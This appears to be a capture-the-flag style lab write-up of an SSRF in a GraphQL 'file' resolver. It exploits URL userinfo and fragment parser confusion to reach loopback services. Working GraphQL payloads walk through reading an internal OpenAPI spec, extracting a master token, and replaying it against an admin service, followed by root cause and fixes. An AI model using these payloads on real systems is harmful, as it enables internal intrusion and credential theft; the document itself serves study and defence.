# SecondQL GraphQL SSRF Parser Confusion

## Date

2026-06-09

## Target Type

Owned lab GraphQL endpoint backed by internal HTTP microservices

## Bug Class

SSRF through URL parser confusion, with upstream response disclosure through GraphQL error messages

## Initial Signal

The GraphQL `file` resolver accepts a user-controlled `service` value and appears to fetch:

```text
http://[service]/api/files/[id]
```

The working test used userinfo and fragment syntax:

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@127.0.0.1:8001#") {
    id
  }
}
```

Observed response:

```text
upstream 200 for http://pwnbox.io@127.0.0.1:8001#/api/files/ - body: OpenAPI 3.1
```

## Failed Assumptions

The important mistake to avoid is treating this as a payload-spam SSRF. The useful signal was not the payload itself; it was the mismatch between what the validator likely accepted and what the HTTP client actually requested.

The fragment character mattered because the backend appended `/api/files/`, but the effective request path was controlled before the fragment:

```text
pwnbox.io@127.0.0.1:8001/openapi.json#/api/files/
```

## Working Theory

Likely parser split:

- Validator or allowlist logic sees an allowed identity involving `pwnbox.io`.
- HTTP client interprets `pwnbox.io` as userinfo.
- HTTP client connects to `127.0.0.1:8001`.
- Fragment syntax prevents the appended `/api/files/` suffix from changing the internal request path.
- GraphQL error handling leaks upstream response bodies when the response cannot be parsed as the expected file object.

## Minimal Reproduction

### 1. Prove Loopback Access

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@127.0.0.1:8001#") {
    id
  }
}
```

Expected signal:

```text
OpenAPI 3.1
```

### 2. Retrieve Internal OpenAPI

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@127.0.0.1:8001/openapi.json#") {
    id
  }
}
```

Useful discovered paths:

```text
/api/contacts
/api/contacts/{id}
/api/files/{id}
/_sentinel/keys.json
```

### 3. Retrieve Internal Control-Plane State

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@127.0.0.1:8001/_sentinel/keys.json#") {
    id
  }
}
```

Observed security-relevant fields:

```text
known_services.contacts = localhost:8001
known_services.admin = localhost:8003
token = pat_3cf63a4202d0227085324370
token_description = Master token. Works for ALL users in the system.
auth scheme = Basic Auth, password = token, username = any value
```

### 4. Replay Token Against Admin Service

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@admin:pat_3cf63a4202d0227085324370@127.0.0.1:8003#") {
    id
  }
}
```

Observed final proof:

```text
pwnbox{7fa64ecb47cb54fece17c58a7105487d}
```

## Why Working Test Worked

The payload did three things at once:

- Passed or confused a host validation assumption involving `pwnbox.io`.
- Directed the executor to loopback using URL userinfo syntax.
- Used `#` so the backend's appended path did not override the intended internal path.

The GraphQL resolver then exposed internal response bodies in error messages, which converted SSRF from a blind primitive into a readable internal HTTP oracle.

## Root Cause

The root cause is inconsistent URL interpretation across validation and execution, combined with unsafe response disclosure:

```text
service parameter accepted by GraphQL
-> insufficient canonicalization
-> allowlist/parser mismatch
-> internal loopback request
-> upstream body reflected in GraphQL error
```

The secondary root cause is exposure of sensitive control-plane state on an internal route without adequate isolation from server-side request primitives.

## Impact

An attacker who can call the GraphQL `file` resolver can:

- Reach loopback-only services.
- Read internal OpenAPI documentation.
- Discover internal control-plane endpoints.
- Extract a super-token.
- Authenticate to the admin service.
- Read the final privileged resource.

## Fix

- Do not build URLs by concatenating untrusted service strings.
- Parse once with a strict URL parser, canonicalize, and validate the final normalized destination.
- Reject userinfo, fragments, non-HTTP schemes, encoded slashes, backslashes, and ambiguous host forms.
- Validate the final socket destination after DNS resolution.
- Block loopback, link-local, private, and metadata IP ranges unless explicitly needed.
- Do not expose upstream response bodies inside GraphQL errors.
- Remove super-token material from internal HTTP endpoints.
- Require service-to-service authentication for control-plane routes.

## Future Checklist Item

For GraphQL/file-fetch SSRF:

```text
service field -> validator parser -> URL builder -> HTTP client parser -> final socket destination -> error body oracle
```

Always test parser confusion and response leakage before moving to broader internal recon.
